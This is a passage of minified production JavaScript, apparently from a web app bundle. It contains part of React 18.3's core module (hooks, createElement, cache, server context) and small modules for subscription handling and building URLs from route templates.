  function U() {
    return new WeakMap();
  }
  function V() {
    return {
      s: 0,
      v: void 0,
      o: null,
      p: null
    };
  }
  var W = {
      current: null
    },
    X = {
      transition: null
    };
  c = {
    ReactCurrentDispatcher: W,
    ReactCurrentCache: T,
    ReactCurrentBatchConfig: X,
    ReactCurrentOwner: I,
    ContextRegistry: {}
  };
  var Y = c.ContextRegistry,
    Z = c.ReactCurrentOwner,
    $ = {
      key: !0,
      ref: !0,
      __self: !0,
      __source: !0
    };
  function e(a, b, c) {
    var d = {},
      e = null,
      f = null;
    void 0 !== c && (e = "" + c);
    void 0 !== b.key && (e = "" + b.key);
    void 0 !== b.ref && (f = b.ref);
    for (c in b) H.call(b, c) && !Object.prototype.hasOwnProperty.call($, c) && (d[c] = b[c]);
    if (a && a.defaultProps) for (c in b = a.defaultProps, b) void 0 === d[c] && (d[c] = b[c]);
    return {
      $$typeof: g,
      type: a,
      key: e,
      ref: f,
      props: d,
      _owner: Z.current
    };
  }
  f.Children = {
    map: R,
    forEach: function (a, b, c) {
      R(a, function () {
        b.apply(this, arguments);
      }, c);
    },
    count: function (a) {
      var b = 0;
      R(a, function () {
        b++;
      });
      return b;
    },
    toArray: function (a) {
      return R(a, function (a) {
        return a;
      }) || [];
    },
    only: function (a) {
      if (!M(a)) throw Error("React.Children.only expected to receive a single React element child.");
      return a;
    }
  };
  f.Component = a;
  f.Fragment = i;
  f.Profiler = k;
  f.PureComponent = d;
  f.StrictMode = j;
  f.Suspense = p;
  f.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = c;
  f.cache = function (a) {
    return function () {
      var b = T.current;
      if (!b) return a.apply(null, arguments);
      var c = b.getCacheForType(U);
      b = c.get(a);
      void 0 === b && (b = V(), c.set(a, b));
      c = 0;
      for (var d = arguments.length; c < d; c++) {
        var e = arguments[c];
        if ("function" === typeof e || "object" === typeof e && null !== e) {
          var f = b.o;
          null === f && (b.o = f = new WeakMap());
          b = f.get(e);
          void 0 === b && (b = V(), f.set(e, b));
        } else f = b.p, null === f && (b.p = f = new Map()), b = f.get(e), void 0 === b && (b = V(), f.set(e, b));
      }
      if (1 === b.s) return b.v;
      if (2 === b.s) throw b.v;
      try {
        var g = a.apply(null, arguments);
        c = b;
        c.s = 1;
        return c.v = g;
      } catch (a) {
        throw g = b, g.s = 2, g.v = a, a;
      }
    };
  };
  f.cloneElement = function (a, b, c) {
    if (null === a || void 0 === a) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + a + ".");
    var d = D({}, a.props),
      e = a.key,
      f = a.ref,
      h = a._owner;
    if (null != b) {
      void 0 !== b.ref && (f = b.ref, h = I.current);
      void 0 !== b.key && (e = "" + b.key);
      if (a.type && a.type.defaultProps) var i = a.type.defaultProps;
      for (j in b) H.call(b, j) && !Object.prototype.hasOwnProperty.call(J, j) && (d[j] = void 0 === b[j] && void 0 !== i ? i[j] : b[j]);
    }
    var j = arguments.length - 2;
    if (1 === j) d.children = c;else if (1 < j) {
      i = Array(j);
      for (var k = 0; k < j; k++) i[k] = arguments[k + 2];
      d.children = i;
    }
    return {
      $$typeof: g,
      type: a.type,
      key: e,
      ref: f,
      props: d,
      _owner: h
    };
  };
  f.createContext = function (a) {
    a = {
      $$typeof: m,
      _currentValue: a,
      _currentValue2: a,
      _threadCount: 0,
      Provider: null,
      Consumer: null,
      _defaultValue: null,
      _globalName: null
    };
    a.Provider = {
      $$typeof: l,
      _context: a
    };
    return a.Consumer = a;
  };
  f.createElement = K;
  f.createFactory = function (a) {
    var b = K.bind(null, a);
    b.type = a;
    return b;
  };
  f.createRef = function () {
    return {
      current: null
    };
  };
  f.createServerContext = function (a, b) {
    var c = !0;
    if (!Y[a]) {
      c = !1;
      var d = {
        $$typeof: n,
        _currentValue: b,
        _currentValue2: b,
        _defaultValue: b,
        _threadCount: 0,
        Provider: null,
        Consumer: null,
        _globalName: a
      };
      d.Provider = {
        $$typeof: l,
        _context: d
      };
      Y[a] = d;
    }
    d = Y[a];
    if (d._defaultValue === z) d._defaultValue = b, d._currentValue === z && (d._currentValue = b), d._currentValue2 === z && (d._currentValue2 = b);else if (c) throw Error("ServerContext: " + a + " already defined");
    return d;
  };
  f.experimental_useEffectEvent = function (a) {
    return W.current.useEffectEvent(a);
  };
  f.experimental_useOptimistic = function (a, b) {
    return W.current.useOptimistic(a, b);
  };
  f.forwardRef = function (a) {
    return {
      $$typeof: o,
      render: a
    };
  };
  f.isValidElement = M;
  f.jsx = e;
  f.jsxDEV = void 0;
  f.jsxs = e;
  f.lazy = function (a) {
    return {
      $$typeof: s,
      _payload: {
        _status: -1,
        _result: a
      },
      _init: S
    };
  };
  f.memo = function (a, b) {
    return {
      $$typeof: r,
      type: a,
      compare: void 0 === b ? null : b
    };
  };
  f.startTransition = function (a, b) {
    var c = X.transition;
    X.transition = {};
    G && void 0 !== b && void 0 !== b.name && (X.transition.name = b.name, X.transition.startTime = -1);
    try {
      a();
    } finally {
      X.transition = c;
    }
  };
  f.unstable_Cache = x;
  f.unstable_DebugTracingMode = u;
  f.unstable_LegacyHidden = w;
  f.unstable_Offscreen = v;
  f.unstable_Scope = t;
  f.unstable_SuspenseList = q;
  f.unstable_TracingMarker = y;
  f.unstable_act = function () {
    throw Error("act(...) is not supported in production builds of React.");
  };
  f.unstable_getCacheForType = function (a) {
    var b = T.current;
    return b ? b.getCacheForType(a) : a();
  };
  f.unstable_getCacheSignal = function () {
    var a = T.current;
    return a ? a.getCacheSignal() : (a = new AbortController(), a.abort(Error("This CacheSignal was requested outside React which means that it is immediately aborted.")), a.signal);
  };
  f.unstable_useCacheRefresh = function () {
    return W.current.useCacheRefresh();
  };
  f.unstable_useMemoCache = function (a) {
    return W.current.useMemoCache(a);
  };
  f.use = function (a) {
    return W.current.use(a);
  };
  f.useCallback = function (a, b) {
    return W.current.useCallback(a, b);
  };
  f.useContext = function (a) {
    return W.current.useContext(a);
  };
  f.useDebugValue = function () {};
  f.useDeferredValue = function (a) {
    return W.current.useDeferredValue(a);
  };
  f.useEffect = function (a, b) {
    return W.current.useEffect(a, b);
  };
  f.useId = function () {
    return W.current.useId();
  };
  f.useImperativeHandle = function (a, b, c) {
    return W.current.useImperativeHandle(a, b, c);
  };
  f.useInsertionEffect = function (a, b) {
    return W.current.useInsertionEffect(a, b);
  };
  f.useLayoutEffect = function (a, b) {
    return W.current.useLayoutEffect(a, b);
  };
  f.useMemo = function (a, b) {
    return W.current.useMemo(a, b);
  };
  f.useReducer = function (a, b, c) {
    return W.current.useReducer(a, b, c);
  };
  f.useRef = function (a) {
    return W.current.useRef(a);
  };
  f.useState = function (a) {
    return W.current.useState(a);
  };
  f.useSyncExternalStore = function (a, b, c) {
    return W.current.useSyncExternalStore(a, b, c);
  };
  f.useTransition = function () {
    return W.current.useTransition();
  };
  f.version = "18.3.0-www-classic-6a82fa33";
}, null);
__d("SubscriptionsHandler", ["invariant"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  function i(a) {
    return a.remove || a.reset || a.unsubscribe || a.cancel || a.dispose;
  }
  function j(a) {
    i(a).call(a);
  }
  a = function () {
    function a() {
      this.$1 = [];
    }
    var b = a.prototype;
    b.addSubscriptions = function () {
      for (var a = arguments.length, b = new Array(a), c = 0; c < a; c++) b[c] = arguments[c];
      b.every(i) || h(0, 3659);
      this.$1 != null ? this.$1 = this.$1.concat(b) : b.forEach(j);
    };
    b.engage = function () {
      this.$1 == null && (this.$1 = []);
    };
    b.release = function () {
      this.$1 != null && (this.$1.forEach(j), this.$1 = null);
    };
    b.releaseOne = function (a) {
      var b = this.$1;
      if (b == null) return;
      var c = b.indexOf(a);
      c !== -1 && (j(a), b.splice(c, 1), b.length === 0 && (this.$1 = null));
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("csx", [], function (a, b, c, d, e, f) {
  function a(a) {
    throw new Error("csx: Unexpected class selector transformation.");
  }
  f["default"] = a;
}, 66);
__d("routeBuilderUtils", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    a = a.split("/");
    return a.filter(function (a) {
      return a !== "";
    }).map(function (a) {
      var b = a.split(/{|}/);
      if (b.length < 3) return {
        isToken: !1,
        part: a
      };else {
        a = b[0];
        var c = b[1];
        b = b[2];
        var d = c[0] === "?",
          e = c[d ? 1 : 0] === "*";
        c = c.substring((d ? 1 : 0) + (e ? 1 : 0));
        return {
          isToken: !0,
          optional: d,
          catchAll: e,
          prefix: a,
          suffix: b,
          token: c
        };
      }
    });
  }
  f.getPathParts = a;
}, 66);
__d("jsRouteBuilder", ["ConstUriUtils", "FBLogger", "routeBuilderUtils"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = "#";
  function a(a, b, e, f, g) {
    g === void 0 && (g = !1);
    var i = d("routeBuilderUtils").getPathParts(a);
    function j(j) {
      try {
        var k = f != null ? babelHelpers["extends"]({}, f, j) : (j = j) != null ? j : {},
          l = {};
        j = "";
        var m = !1;
        j = i.reduce(function (a, c) {
          if (!c.isToken) return a + "/" + c.part;else {
            var d,
              e = c.optional,
              f = c.prefix,
              g = c.suffix;
            c = c.token;
            if (e && m) return a;
            d = (d = k[c]) != null ? d : b[c];
            if (d == null && e) {
              m = !0;
              return a;
            }
            if (d == null) throw new Error("Missing required template parameter: " + c);
            if (d === "") throw new Error("Required template parameter is an empty string: " + c);
            l[c] = !0;
            return a + "/" + f + d + g;
          }
        }, "");
        a.slice(-1) === "/" && (j += "/");
        j === "" && (j = "/");
        var n = d("ConstUriUtils").getUri(j);
        for (var o in k) {
          var p = k[o];
          !l[o] && p != null && n != null && (e != null && e.has(o) ? p !== !1 && (n = n.addQueryParam(o, null)) : n = n.addQueryParam(o, p));
        }
        return [n, j];
      } catch (b) {
        p = b == null ? void 0 : b.message;
        o = c("FBLogger")("JSRouteBuilder").blameToPreviousFrame().blameToPreviousFrame();
        g && (o = o.blameToPreviousFrame());
        o.mustfix("Failed building URI for base path: %s message: %s", a, p);
        return [null, h];
      }
    }
    return {
      buildUri: function (a) {
        a = (a = j(a)[0]) != null ? a : d("ConstUriUtils").getUri(h);
        if (a == null) throw new Error("Not even the fallback URL parsed validly!");
        return a;
      },
      buildUriNullable: function (a) {
        return j(a)[0];
      },
      buildURL: function (a) {
        a = j(a);
        var b = a[0];
        a = a[1];
        return (b = b == null ? void 0 : b.toString()) != null ? b : a;
      },
      buildURLStringDEPRECATED: function (a) {
        a = j(a);
        var b = a[0];
        a = a[1];
        return (b = b == null ? void 0 : b.toString()) != null ? b : a;
      }
    };
  }
  g["default"] = a;
}, 98);